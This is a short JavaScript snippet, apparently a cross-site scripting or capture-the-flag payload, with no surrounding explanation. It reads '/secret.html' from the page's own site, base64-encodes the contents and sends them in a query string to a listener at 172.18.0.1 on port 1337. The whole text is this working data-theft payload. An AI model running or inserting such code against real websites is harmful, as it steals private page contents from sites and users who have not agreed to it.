fetch('/secret.html')
  .then(response => response.text())  // Get the response as text
  .then(text => {
    const base64Encoded = btoa(text);  // Convert text to Base64
    const targetURL = `http://172.18.0.1:1337/?result=${encodeURIComponent(base64Encoded)}`;

    fetch(targetURL, { method: 'GET', mode: 'no-cors' })  // Send GET request
      .catch(err => console.error('Error sending data:', err));
  })
  .catch(err => console.error('Error fetching secret.html:', err));
